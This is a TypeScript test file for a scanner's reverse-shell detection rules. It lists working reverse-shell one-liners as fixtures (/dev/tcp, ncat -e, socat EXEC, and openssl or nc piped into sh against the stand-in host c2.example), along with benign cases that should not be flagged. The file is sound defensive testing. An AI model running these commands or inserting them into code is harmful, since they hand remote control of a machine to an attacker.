import { describe, expect, it } from 'vitest';
import { REVERSE_SHELL_RULES } from './reverse-shell.rules';
import { addedOnlyDiff, makeChange, ruleById } from './test-support';

describe('reverse-shell rules', () => {
  it.each([
    ['SHELL-001', 'exec 3<>/dev/tcp/10.0.0.1/4444'],
    ['SHELL-002', 'ncat 10.0.0.1 4444 -e /bin/bash'],
    ['SHELL-002', 'ncat -lvnp 4444 --exec /bin/sh'],
    ['SHELL-003', 'python3 -c "import socket; s = socket.socket()'],
    ['SHELL-003', 'pty.spawn("/bin/bash")'],
    ['SHELL-004', 'socat TCP-LISTEN:4444,fork EXEC:/bin/sh'],
    ['SHELL-004', 'socat TCP-LISTEN:4444,fork SYSTEM:/bin/bash'],
    ['CAUR-OPENSSL-SHELL', 'openssl s_client -quiet -connect c2.example:443 | sh'],
    ['CAUR-NETPIPE-SHELL', 'mkfifo /tmp/f; nc c2.example 4444 < /tmp/f | sh > /tmp/f'],
    ['CAUR-NETPIPE-SHELL', 'telnet c2.example 4444 | bash'],
    ['CAUR-NETPIPE-SHELL', 'sh -c "whoami" | nc c2.example 4444'],
  ])('flags %s for %j', (id, line) => {
    expect(ruleById(REVERSE_SHELL_RULES, id).check(makeChange(addedOnlyDiff([line])))).not.toBeNull();
  });

  it('does not flag harmless netcat usage', () => {
    const change = makeChange(addedOnlyDiff(['echo test | nc localhost 1234']));
    expect(REVERSE_SHELL_RULES.flatMap((rule) => rule.check(change) ?? [])).toHaveLength(0);
  });

  it('does not flag certificate inspection piping into openssl instead of a shell', () => {
    const change = makeChange(
      addedOnlyDiff(['echo | openssl s_client -connect host:443 2>/dev/null | openssl x509 -noout -dates']),
    );
    expect(ruleById(REVERSE_SHELL_RULES, 'CAUR-OPENSSL-SHELL').check(change)).toBeNull();
  });
});
